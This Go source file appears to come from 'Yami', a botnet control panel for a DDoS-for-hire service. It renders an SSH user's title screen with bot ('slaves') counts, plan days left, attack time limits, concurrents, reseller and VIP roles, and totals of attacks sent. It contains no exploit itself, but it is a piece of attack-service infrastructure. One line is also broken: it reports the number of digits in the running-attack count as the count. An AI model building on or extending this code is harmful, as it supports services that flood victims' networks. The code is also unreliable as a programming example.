package Branding

import (
	"Yami/core/clients/session"
	"Yami/core/db"
	"Yami/core/functions"
	"Yami/core/models/tfx"
	"Yami/core/slaves"
	"fmt"
	"io"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

func TermFXExecuteTitle(name string, conn *ssh.ServerConn) (string, error) {

	New := termfx.New()

	User, err := YamiDB.GetUser(conn.User()); if err != nil || User == nil {
		return "", fmt.Errorf("Failed to get user account details")
	}


	lol := time.Duration(time.Until(time.Unix(User.PlanExpiry, 0))).Hours()/24

	running,_ := YamiDB.GetRunning()


	New.RegisterVariable("motd", functions.Motd)
	New.RegisterVariable("slaves", Slaves.Get())
	New.RegisterVariable("daysleft", strconv.FormatFloat(lol, 'f', 2, 64))
	New.RegisterVariable("username", conn.User())
	New.RegisterVariable("online", strconv.Itoa(Sessions.Online()))
	New.RegisterVariable("maxtime", strconv.Itoa(User.MaxTime))
	New.RegisterVariable("cooldown", strconv.Itoa(User.Cooldown))
	New.RegisterVariable("concurrents", strconv.Itoa(User.Concurrents))
	New.RegisterVariable("running", strconv.Itoa(len(strconv.Itoa(running))))
	New.RegisterVariable("sent", strconv.Itoa(YamiDB.AmmountSent()))
	New.RegisterVariable("mysent", strconv.Itoa(YamiDB.MySent(conn.User())))

	if User.Admin {
		New.RegisterVariable("role", "Admin")
	} else if User.Reseller {
		New.RegisterVariable("role", "Reseller")
	} else if User.Vip {
		New.RegisterVariable("role", "User-VIP")
	} else {
		New.RegisterVariable("role", "Regular")
	}
	New.RegisterFunction("spinner", func(session io.Writer, args string) (int, error) {

		return 0, nil
	})

	for _, s := range BrandingWorker {
		if s.CommandName == name {
			File, err := New.ExecuteString(s.CommandContains)
			return File, err
		}
	}

	return "", fmt.Errorf("Failed to get your title file")
}